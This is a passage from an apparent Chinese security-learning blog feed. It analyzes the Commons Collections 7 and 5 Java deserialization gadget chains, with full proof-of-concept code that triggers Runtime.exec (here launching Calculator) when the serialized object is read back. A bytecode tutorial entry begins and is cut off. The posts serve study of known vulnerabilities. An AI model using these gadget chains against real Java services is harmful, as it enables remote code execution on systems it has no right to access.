alt="image-20221011153118215"></p><p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap#get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p><p>我们回到原来的<code>Hashtable</code>类，既然在<code>readObject()</code>方法对输入流进行反序列化，那么我们就去看序列化的方法<code>writeObject()</code><br><img src="/2021/11/10/CommonsCollections7/image-20221011153622433.png" alt="image-20221011153622433"></p><p>这里的<code>entryStack.key</code>和<code>entryStack.value</code>则是我们通过<code>put()</code>传入的<code>key</code>和<code>value</code>。因此我们如果<code>put()</code>方法中的<code>key</code>为<code>LazyMap</code>对象的话，最终<code>m</code>则是<code>LazyMap</code>对象。</p><p>这里还剩下一个问题，就是怎么调用到<code>AbstractMap#equals()</code>方法呢？</p><p>首先我们必须构造<code>key</code>为<code>LazyMap</code>对象，最后才能调用到<code>LazyMap#get()</code>。因此我们再回来看看<code>LazyMap</code>类<br><img src="/2021/11/10/CommonsCollections7/image-20221011162909030.png" alt="image-20221011162909030"></p><p>搜索一遍并没有发现<code>LazyMap</code>类有<code>equals()</code>方法，但最后注意到<code>LazyMap</code>类继承于<code>AbstractMapDecorator</code>类，跟进<br><img src="/2021/11/10/CommonsCollections7/image-20221011163120529.png" alt="image-20221011163120529"></p><p><code>AbstractMapDecorator</code>类含有<code>equals()</code>方法。根据前面的学习，我们会构造以下 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br></pre></td></tr></table></figure><p>所以此时的<code>this.map</code>为<code>HashMap</code>类对象，因此接下来会进入<code>HashMap#equals()</code><br><img src="/2021/11/10/CommonsCollections7/image-20221011163412678.png" alt="image-20221011163412678"></p><p>而<code>HashMap</code>又继承于<code>AbstractMap</code>类，因此最终会调用到<code>AbstractMap#equals()</code>方法，整条利用链就通了，妙哉。</p><p>最终 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections7</span> <span class="variable">commonsCollections7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections7</span>();</span><br><span class="line">        commonsCollections7.serialize();</span><br><span class="line">        commonsCollections7.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>POC 中有几个问题需要解答。</p><ul><li>为什么<code>Hashtable</code>需要 put 两次？</li></ul><p>在<code>Hashtable#reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221011164109290.png" alt="image-20221011164109290"></p><p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code>elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221011164346546.png" alt="image-20221011164346546"></p><ul><li>为什么<code>lazyMap()</code>需要<code>yy</code>和<code>zZ</code>两个字符串？</li></ul><p>还是<code>reconstitutionPut()</code>方法，<code>e.hash == hash</code>会判断上一个<code>key</code>的<code>hash</code>是否与当前<code>key</code>的<code>hash</code>相等，只有相等才能进入下一步。<br><img src="/2021/11/10/CommonsCollections7/image-20221011165323252.png" alt="image-20221011165323252"></p><p>而字符串<code>yy</code>和<code>zZ</code>经过<code>hashCode()</code>方法计算是相等的<br><img src="/2021/11/10/CommonsCollections7/image-20221011170202472.png" alt="image-20221011170202472"></p><p>那么为什么这两个字符串会相等呢？因为是字符串，所以我们跟进<code>String#hashCode()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221011171013521.png" alt="image-20221011171013521"></p><p>算法就这一句<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = 31 * h + val[i];</span><br></pre></td></tr></table></figure></p><p>首先第一个<code>y</code>的<code>ascii</code>值为 121，而第一个<code>z</code>的<code>ascii</code>值为 122，经过计算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:  y-&gt;121 y-&gt; 121*31 + 121 = 3872</span><br><span class="line">b:  z-&gt;122 ？-&gt; 122*31 + ？  = 3872  -&gt; ? = 90</span><br></pre></td></tr></table></figure></p><p>所以要想<code>a</code>和<code>b</code>经过<code>hashCode()</code>方法计算相等，<code>b</code>的第二个元素就得比<code>a</code>小，结果为<code>Z</code>，<code>Z</code>的<code>ascii</code>值为 90</p><ul><li>为什么最后要<code>remove(&quot;yy&quot;)</code>？</li></ul><p>问题出在<code>AbstractMap#equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等。<br><img src="/2021/11/10/CommonsCollections7/image-20221012102519876.png" alt="image-20221012102519876"></p><p>那么还剩一下问题，为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</p><p>在<code>Hashtable#put()</code>方法时也会调用一次<code>entry.key.equals(key)</code><br><img src="/2021/11/10/CommonsCollections7/image-20221012103923937.png" alt="image-20221012103923937"></p><p>因此在<code>hashtable.put(lazyMap2, 2);</code>之后跟到<code>AbstractMap()#equals()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221012104621160.png" alt="image-20221012104621160"></p><p>这里可以看到，传入<code>LazyMap#get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap#get()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221012104834141.png" alt="image-20221012104834141"></p><p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections5利用链分析</title>
      <link href="/2021/11/10/CommonsCollections5/"/>
      <url>/2021/11/10/CommonsCollections5/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections5-利用链分析"><a href="#CommonsCollections5-利用链分析" class="headerlink" title="CommonsCollections5 利用链分析"></a>CommonsCollections5 利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天接着学习<code>CommonsCollections5</code>利用链，利用环境如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK 8u76之前</span><br></pre></td></tr></table></figure></p><p><code>ysoserial</code>给出的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>前面的<code>BadAttributeValueExpException</code>和<code>TiedMapEntry</code>倒是新知识，后面的则是前面<code>CommonsCollections1</code>的内容。看样子这条链子是找了其他能触发<code>LazyMap#get()</code>的方法。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>按照利用链跟进能触发<code>LazyMap#get()</code>方法的<code>TiedMapEntry</code>类的<code>toString()</code>方法<br><img src="/2021/11/10/CommonsCollections5/image-20221011112752765.png" alt="image-20221011112752765"></p><p>跟进<code>getValue()</code>方法源码<br><img src="/2021/11/10/CommonsCollections5/image-20221011112827805.png" alt="image-20221011112827805"></p><p>可以看到调用了<code>map.get()</code>方法，而<code>map</code>是通过构造方法传入的值，完全可控。接下来就是找到能触发<code>TiedMapEntry#toString()</code>方法的地方，在<code>CommonsCollections5</code>用到的是<code>BadAttributeValueExpException</code>类，跟进该类的<code>readObject()</code>方法<br><img src="/2021/11/10/CommonsCollections5/image-20221011144219939.png" alt="image-20221011144219939"></p><p>其中<code>valObj</code>是从成员属性取的<code>val</code>，而<code>val</code>我们可以通过反射控制，因此成为可控点。并且<code>System.getSecurityManager()</code>方法默认为<code>null</code>，因此可以进入<code>else if</code>条件触发<code>valObj.toString();</code></p><p>开始编写 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/11 11:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections5</span> <span class="variable">commonsCollections5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections5</span>();</span><br><span class="line">        commonsCollections5.serialize();</span><br><span class="line">        commonsCollections5.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="number">666</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/CommonsCollections5/image-20221011144759763.png" alt="image-20221011144759763"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java字节码</title>
      <link href="/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2021/11/10/Java%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面学习已经知道<code>Java</code>文件<code>*.java</code>通过编译后会产生<code>*.class</code>文件，<code>class</code>文件有固定的二进制格式，其结构在<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">第四章：The class File Format</a>中写了详细说明。</p><p>示例文件<code>HelloWorld.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/27 16:46</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 